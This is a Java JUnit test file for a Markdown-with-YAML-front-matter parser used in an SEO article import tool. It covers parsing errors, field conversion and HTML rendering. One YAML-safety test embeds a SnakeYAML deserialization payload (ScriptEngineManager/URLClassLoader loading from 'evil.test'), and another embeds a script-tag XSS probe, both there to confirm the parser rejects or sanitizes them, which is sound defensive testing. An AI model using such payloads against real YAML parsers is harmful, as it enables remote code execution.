package com.jiuyu.replay.system.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 导入用 Markdown 解析的单测。
 *
 * <p>覆盖的是「运营拿到的失败提示是否说得清楚」这件事——解析层的每个失败分支
 * 都对应导入结果里的一条 notes，含糊的提示等于让人重猜。
 *
 * @author claude
 * @date 2026-08-13
 */
@DisplayName("SEO 导入 Markdown 解析")
class SeoMarkdownParserTest {

    private static final String VALID = """
            ---
            title: 直播复盘怎么做
            category: 直播运营
            cover: https://example.com/a.jpg
            tags: [直播复盘, 数据分析]
            ---

            ## 为什么复盘常常无效

            多数团队停在念数据。
            """;

    @Nested
    @DisplayName("front matter 拆分")
    class FrontMatterSplit {

        @Test
        @DisplayName("正常文件：键值解析正确，正文不含 front matter")
        void parse_validFile_splitsFrontMatterAndBody() {
            SeoMarkdownParser.ParsedMarkdown parsed = SeoMarkdownParser.parse(VALID);

            assertEquals("直播复盘怎么做",
                    SeoMarkdownParser.getString(parsed.frontMatter(), "title").orElseThrow());
            assertEquals("直播运营",
                    SeoMarkdownParser.getString(parsed.frontMatter(), "category").orElseThrow());
            assertTrue(parsed.bodyHtml().contains("<h2>为什么复盘常常无效</h2>"), parsed.bodyHtml());
            assertFalse(parsed.bodyHtml().contains("直播运营"),
                    "front matter 泄漏进了正文：" + parsed.bodyHtml());
        }

        @Test
        @DisplayName("缺 front matter：提示要写什么，而不是只说格式错误")
        void parse_withoutFrontMatter_messageTellsWhatToWrite() {
            SeoMarkdownParser.MarkdownParseException e = assertThrows(
                    SeoMarkdownParser.MarkdownParseException.class,
                    () -> SeoMarkdownParser.parse("## 直接就是正文\n\n没有 front matter。"));

            assertTrue(e.getMessage().contains("title"), e.getMessage());
            assertTrue(e.getMessage().contains("---"), e.getMessage());
        }

        @Test
        @DisplayName("带 BOM 与前导空行仍能解析——从别处复制粘贴出来的文件常带这些")
        void parse_withBomAndBlankLines_stillParses() {
            SeoMarkdownParser.ParsedMarkdown parsed = SeoMarkdownParser.parse("﻿\n" + VALID);

            assertEquals("直播复盘怎么做",
                    SeoMarkdownParser.getString(parsed.frontMatter(), "title").orElseThrow());
        }

        @Test
        @DisplayName("YAML 语法错误：给出 front matter 内的行号")
        void parse_malformedYaml_reportsLineNumber() {
            String broken = """
                    ---
                    title: 正常
                    tags: [未闭合
                    ---

                    正文
                    """;

            SeoMarkdownParser.MarkdownParseException e = assertThrows(
                    SeoMarkdownParser.MarkdownParseException.class,
                    () -> SeoMarkdownParser.parse(broken));

            assertTrue(e.getMessage().contains("YAML 解析失败"), e.getMessage());
        }

        @Test
        @DisplayName("空文件直接报「内容为空」")
        void parse_blankContent_throws() {
            assertThrows(SeoMarkdownParser.MarkdownParseException.class,
                    () -> SeoMarkdownParser.parse("   \n  "));
        }

        @Test
        @DisplayName("front matter 是数组而非键值对时报错，不是静默当成空 Map")
        void parse_frontMatterNotMapping_throws() {
            String broken = """
                    ---
                    - 直播复盘
                    - 数据分析
                    ---

                    正文
                    """;

            SeoMarkdownParser.MarkdownParseException e = assertThrows(
                    SeoMarkdownParser.MarkdownParseException.class,
                    () -> SeoMarkdownParser.parse(broken));

            assertTrue(e.getMessage().contains("键值对"), e.getMessage());
        }
    }

    @Nested
    @DisplayName("YAML 安全")
    class YamlSafety {

        @Test
        @DisplayName("!!javax.script.ScriptEngineManager 标签被拒绝——front matter 是不可信输入")
        void parse_withJavaTypeTag_rejected() {
            String malicious = """
                    ---
                    title: 正常标题
                    payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.test/"]]]]
                    ---

                    正文
                    """;

            assertThrows(SeoMarkdownParser.MarkdownParseException.class,
                    () -> SeoMarkdownParser.parse(malicious),
                    "SafeConstructor 未生效，YAML 能在解析阶段实例化任意类");
        }

        @Test
        @DisplayName("重复键被拒绝，避免后一个静默覆盖前一个")
        void parse_duplicateKeys_rejected() {
            String duplicated = """
                    ---
                    title: 第一个标题
                    title: 第二个标题
                    ---

                    正文
                    """;

            assertThrows(SeoMarkdownParser.MarkdownParseException.class,
                    () -> SeoMarkdownParser.parse(duplicated));
        }
    }

    @Nested
    @DisplayName("字段取值")
    class FieldAccess {

        @Test
        @DisplayName("非字符串标量统一 toString，不抛 ClassCastException")
        void getString_nonStringScalar_convertsInsteadOfThrowing() {
            String md = """
                    ---
                    title: 2026 年直播复盘
                    publishTime: 2026-08-13
                    seoTitle: 12345
                    ---

                    正文
                    """;
            Map<String, Object> frontMatter = SeoMarkdownParser.parse(md).frontMatter();

            // YAML 会把 2026-08-13 解析成 Date、12345 解析成 Integer；
            // 强转 String 会在这里抛 ClassCastException，运营只看到「导入失败」
            assertTrue(SeoMarkdownParser.getString(frontMatter, "publishTime").isPresent());
            assertEquals("12345", SeoMarkdownParser.getString(frontMatter, "seoTitle").orElseThrow());
        }

        @Test
        @DisplayName("缺失键与空白值都返回空 Optional")
        void getString_missingOrBlank_returnsEmpty() {
            String md = """
                    ---
                    title: 标题
                    summary: "   "
                    ---

                    正文
                    """;
            Map<String, Object> frontMatter = SeoMarkdownParser.parse(md).frontMatter();

            assertTrue(SeoMarkdownParser.getString(frontMatter, "summary").isEmpty());
            assertTrue(SeoMarkdownParser.getString(frontMatter, "notExist").isEmpty());
        }

        @Test
        @DisplayName("列表写法与逗号分隔写法都认，AI 产出两种都会出现")
        void getStringList_bothSyntaxes_parsed() {
            Map<String, Object> listStyle = SeoMarkdownParser.parse("""
                    ---
                    tags: [直播复盘, 数据分析]
                    ---
                    正文
                    """).frontMatter();
            Map<String, Object> scalarStyle = SeoMarkdownParser.parse("""
                    ---
                    tags: 直播复盘，数据分析
                    ---
                    正文
                    """).frontMatter();

            assertEquals(List.of("直播复盘", "数据分析"),
                    SeoMarkdownParser.getStringList(listStyle, "tags"));
            // 中文逗号也要认——中文写作里它比半角逗号更常见
            assertEquals(List.of("直播复盘", "数据分析"),
                    SeoMarkdownParser.getStringList(scalarStyle, "tags"));
        }

        @Test
        @DisplayName("标签去重且保持原顺序——重复 ID 会撞文章标签关联表的唯一索引")
        void getStringList_duplicates_removedKeepingOrder() {
            Map<String, Object> frontMatter = SeoMarkdownParser.parse("""
                    ---
                    tags: [直播复盘, 数据分析, 直播复盘]
                    ---
                    正文
                    """).frontMatter();

            assertEquals(List.of("直播复盘", "数据分析"),
                    SeoMarkdownParser.getStringList(frontMatter, "tags"));
        }

        @Test
        @DisplayName("缺失的列表字段返回空列表而非 null")
        void getStringList_missing_returnsEmptyList() {
            Map<String, Object> frontMatter = SeoMarkdownParser.parse(VALID).frontMatter();

            assertTrue(SeoMarkdownParser.getStringList(frontMatter, "seoKeywords").isEmpty());
        }
    }

    @Nested
    @DisplayName("Markdown 转 HTML")
    class HtmlRendering {

        @Test
        @DisplayName("GFM 表格被渲染成 table——没有扩展时会退化成一段纯文本")
        void toHtml_gfmTable_rendersTableElement() {
            String html = SeoMarkdownParser.toHtml("""
                    | 指标 | 目标 |
                    |---|---|
                    | GMV | 100万 |
                    """);

            assertTrue(html.contains("<table>"), html);
            assertTrue(html.contains("<th>指标</th>"), html);
            assertTrue(html.contains("<td>GMV</td>"), html);
        }

        @Test
        @DisplayName("h1 原样输出，降级交给 SeoHtmlSanitizer——过滤规则只留一份")
        void toHtml_h1_leftForSanitizer() {
            String html = SeoMarkdownParser.toHtml("# 一级标题");

            assertTrue(html.contains("<h1>一级标题</h1>"), html);
            // 与 sanitize 串起来才是入库形态
            assertTrue(SeoHtmlSanitizer.sanitize(html).contains("<h2>一级标题</h2>"));
        }

        @Test
        @DisplayName("md 里的脚本标签会原样渲染出来——正文必须再过 sanitize 才能入库")
        void toHtml_inlineScript_notFilteredHere() {
            String html = SeoMarkdownParser.toHtml("<script>alert(1)</script>");

            // 断言当前行为：解析层不过滤。若哪天这里开始过滤了，说明白名单出现了第二份，
            // 两份迟早不一致——那时该改的是这条断言背后的设计，而不是悄悄接受
            assertTrue(html.contains("<script>"), html);
            assertFalse(SeoHtmlSanitizer.sanitize(html).contains("<script>"));
        }

        @Test
        @DisplayName("图片语法渲染成 img 标签，导入才有 src 可替换")
        void toHtml_image_rendersImgTag() {
            String html = SeoMarkdownParser.toHtml("![封面](https://example.com/a.jpg)");

            assertTrue(html.contains("<img"), html);
            assertTrue(html.contains("src=\"https://example.com/a.jpg\""), html);
        }

        @Test
        @DisplayName("空正文返回空串而不是 null")
        void toHtml_blank_returnsEmptyString() {
            assertEquals("", SeoMarkdownParser.toHtml("   "));
            assertEquals("", SeoMarkdownParser.toHtml(null));
        }
    }
}
